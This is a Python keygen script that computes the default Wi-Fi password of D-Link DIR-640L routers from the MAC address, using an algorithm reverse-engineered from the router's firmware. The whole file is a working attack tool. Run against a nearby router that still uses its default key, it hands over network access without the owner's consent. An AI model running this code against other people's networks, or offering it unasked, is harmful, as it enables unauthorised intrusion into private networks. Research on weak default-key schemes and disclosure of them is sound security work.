# keygen for the D-link DIR-640L with SSID dlink-XXXX (with XXXX the last two bytes of the MAC)
# much thanks to Strongwind for their large collection of dlink firmware
# and thanks to Selenium for the incredibly fast implementation of the found /usr/bin/wifi_key_default
# into QEMU emulation

import hashlib
import argparse

def passgen(input, pwd_length, mode):

	numbers = "0123456789"
	vowels_lc = "aeiou"
	vowels_uc = "AEIOU"
	cons_lc = "bcdfghjklmnpqrstvwxyz"
	cons_uc = "BCDFGHJKLMNPQRSTVWXYZ"
	hexx = "abcdef"

	if mode == 1:
		charset = vowels_lc + cons_lc
	elif mode == 2:
		charset = vowels_lc + vowels_uc + cons_lc + cons_uc
	elif mode == 3:
		charset = cons_uc
	elif mode == 4:
		charset = vowels_lc + vowels_uc + cons_lc + cons_uc + numbers
	elif mode == 5:
		charset = numbers
	elif mode == 6:
		charset = numbers + hexx

	hashh = hashlib.md5()
	hashh.update(input.encode())
	digest = hashh.digest()

	pwd = ''
	for i in range(pwd_length):
		hashh2 = hashlib.md5()
		hashh2.update(digest)
		new_digest = hashh2.digest()
		long_int = 0
		long_int = long_int + new_digest[0]
		long_int = long_int + new_digest[1] * 2 ** 8
		long_int = long_int + new_digest[2] * 2 ** 16
		long_int = long_int + new_digest[3] * 2 ** 24

		char_pos = long_int % len(charset)
		letter = charset[char_pos]
		pwd += letter
		if mode == 3:
			if len(charset) == 5:
				charset = cons_lc
			else:
				charset = vowels_lc
		digest = new_digest
	return pwd

def dir_640l(mac):
	
	last_mac_byte = int(mac[-2:], 16)
	pwd_mode = last_mac_byte % 5

	mac_order = [1, 2, 3, 4, 5, 6]
	if pwd_mode == 2 or pwd_mode == 4:
		mac_order = [3, 2, 1, 6, 5, 4]
	elif pwd_mode == 0:
		mac_order = [6, 5, 4, 3, 2, 1]


	input_string2 = []
	for i in range(0, 12, 2):
		input_string2.append(mac[i:i+2].upper())
	input_string = []
	for i in mac_order:
		input_string.append(input_string2[i-1])

	input_string = "_"+"_".join(input_string).upper()
	input_string += chr(10)

	if pwd_mode == 0:
		hashh = passgen(input_string, 32, 6)
	else:
		hashh = hashlib.sha1()
		hashh.update(input_string.encode())
		hashh = list(hashh.hexdigest())
	key = [hashh[0], hashh[1], hashh[6], hashh[7], hashh[14], hashh[15], hashh[22], hashh[23], hashh[30], hashh[31]]

	password = [''] * 10
	for i in range(1, 11):
		letter = key[i-1]
		letter_value = int(letter, 16)
		if i > 5:
			password[i-1] = chr(48 + (letter_value % 10))
		else:
			if i & 1 == 0:
				password[i-1] = chr(107 + letter_value)
			else:
				password[i-1] = chr(97 + letter_value)
	password = "".join(password)
	
	print(password)




parser = argparse.ArgumentParser(description='Keygen for the D-link DIR-640L with SSID dlink-XXXX')
parser.add_argument('mac', help='Mac address (mac-1)')
args = parser.parse_args()

dir_640l(args.mac)
